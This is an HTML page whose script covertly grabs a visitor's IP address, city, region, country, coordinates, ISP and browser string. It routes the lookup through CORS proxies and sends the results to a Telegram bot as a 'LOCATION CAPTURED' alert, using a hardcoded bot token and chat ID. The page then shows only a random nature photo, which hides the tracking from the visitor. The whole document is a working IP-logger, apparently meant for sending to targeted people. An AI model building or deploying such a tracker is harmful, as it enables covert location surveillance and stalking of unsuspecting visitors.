<!DOCTYPE html>
<html>
<head><title></title></head>
<body style="margin:0;padding:0;overflow:hidden;background:#111">
<script>
const uid = new URLSearchParams(location.search).get('uid') || 'anon';

// CORS-PROOF GEO APIs (no blocks)
async function getGeo() {
    // Proxy 1: allorigins.win (unlimited)
    try {
        const resp = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent('https://ipinfo.io/json')}`);
        const data = await resp.json();
        return JSON.parse(data.contents);
    } catch(e) {}
    
    // Proxy 2: corsproxy.io
    try {
        const resp = await fetch('https://corsproxy.io/?' + encodeURIComponent('https://ipinfo.io/json'));
        return await resp.json();
    } catch(e) {}
    
    // Direct fallback (ipinfo allows some CORS)
    return await fetch('https://ipinfo.io/json').then(r=>r.json()).catch(()=>null);
}

async function track() {
    const geo = await getGeo();
    const data = {
        uid, ip: geo?.ip,
        city: geo?.city,
        region: geo?.region,
        country: geo?.country,
        loc: geo?.loc?.split(','),
        org: geo?.org,
        ua: navigator.userAgent.slice(0,80)
    };
    
    // REPLACE THESE 2 LINES WITH YOUR TOKENS:
    const token = '7963281665:AAGjAIHudBsFs-FrPeU3TgTi0DWwAYRkIac';  // From @BotFather
    const chatId = '1572681805';    // From getUpdates
    
    const msg = `*🎯 ${data.uid} LOCATION CAPTURED!*` +
        `\n📍 *${data.city || 'Unknown'}, ${data.region || ''}*` +
        `\n🌍 ${data.country || ''}` +
        `\n📡 ${data.loc ? data.loc[0]+', '+data.loc[1] : 'N/A'}` +
        `\n💻 *${data.ip}*` +
        `\n🏢 ${data.org || ''}`;
    
    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
        console.log('✅ LOCATION SENT!');
    } catch(e) {
        console.error('❌ TELEGRAM ERROR - check tokens');
    }
    
    document.body.innerHTML='<img src="https://source.unsplash.com/random/900x600/?nature" style="width:100vw;height:100vh;object-fit:cover;">';
}

track();
</script>
</body>
</html>
